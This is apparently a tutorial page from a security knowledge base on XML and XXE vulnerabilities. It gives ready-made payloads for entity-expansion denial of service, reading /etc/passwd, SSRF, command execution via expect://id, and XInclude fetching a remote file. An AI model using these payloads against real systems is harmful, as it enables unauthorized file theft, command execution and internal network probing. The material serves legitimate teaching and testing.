XXE
======================================

XML Basics
--------------------------------------
XML refers to the extensible markup language (eXtensible Markup Language), a markup language used to mark electronic files to make them structural, designed to transmit and store data. The XML document structure includes XML declarations, DTD document type definitions (optional), and document elements. At present, XML files are widely used as configuration files (Spring, Struts2, etc.), document structure description files (PDF, RSS, etc.), and image format files (SVG header). The syntax specification of XML is controlled by DTD (Document Type Definition).

Basic syntax
--------------------------------------
XML document has a structure called XML prolog at the beginning of the XML document. and encoding are optional, but must be placed at the beginning of the document.

In addition to optional beginnings, XML syntax mainly has the following characteristics:

- All XML elements must have a closed tag
- XML tags are case sensitive
- XML must be nested correctly
- XML documents must have root elements
- The attribute value of XML requires quotes

In addition, XML also has CDATA syntax, which is used to handle situations where multiple characters need to be escaped.

XXE
--------------------------------------
When references to external entities are allowed, malicious XML content can be constructed, resulting in the consequences of reading arbitrary files, executing system commands, detecting intranet ports, and attacking intranet websites. In general XXE attacks, only if the server has echo or errors, the XXE vulnerability can be used to read server-side files, but the attack can also be achieved through Blind XXE.

Attack method
--------------------------------------

Denial of Service Attack
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::

<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<! Entity a0 "dos">
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;">
]>
<data>&a2;</data>

If the parsing process is very slow, it means that the test is successful and the target site may have a denial of service vulnerability.
Specific attacks can use more layers of iteration or recursion, or reference huge external entities to achieve the effect of the attack.


File reading
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::

<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>

SSRF
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::

<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://publicServer.com/" [
<!ELEMENT data (#ANY)>
]>
<data>4</data>

RCE
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::

<?xml version="1.0"?>
<!DOCTYPE GVI [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<catalog>
<core id="test101">
<description>&xxe;</description>
</core>
</catalog>

XInclude
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::

<?xml version='1.0'?>
<data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://publicServer.com/file.xml"></xi:include></data>

Reference link
--------------------------------------
- `XML Tutorial <http://www.w3school.com.cn/xml/>`_
- `Where is unknown attack, know how to defend XXE vulnerability attack and defense <https://security.tencent.com/index.php/blog/msg/69>`_
- `XXE Attack Note Sharing <http://www.freebuf.com/articles/web/97833.html>`_
- `From XML related step by step to XXE vulnerability <https://xz.aliyun.com/t/6887>`_
